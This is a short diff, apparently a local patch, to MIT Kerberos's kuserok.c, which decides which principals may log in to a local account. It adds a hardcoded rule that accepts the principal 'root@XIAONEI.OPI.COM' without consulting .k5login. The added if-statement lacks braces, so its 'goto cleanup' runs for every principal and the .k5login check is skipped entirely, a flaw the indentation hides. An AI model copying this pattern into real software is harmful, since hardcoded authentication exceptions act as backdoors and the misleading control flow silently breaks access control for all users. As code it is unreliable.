@@ -1,0 +1,14 @@
+--- krb5/src/lib/krb5/os/kuserok.c	2013-08-21 15:12:20.237187308 +0800
++++ krb5/src/lib/krb5/os/kuserok.c	2013-08-21 15:11:59.436239842 +0800
+@@ -117,6 +117,11 @@
+     if (krb5_unparse_name(context, principal, &princname) != 0)
+         goto cleanup;
+ 
++    /* Accept root. */
++    if (strcmp("root@XIAONEI.OPI.COM", princname) == 0)
++	result = ACCEPT;
++        goto cleanup;
++
+     fp = fopen(filename, "r");
+     if (fp == NULL)
+         goto cleanup;
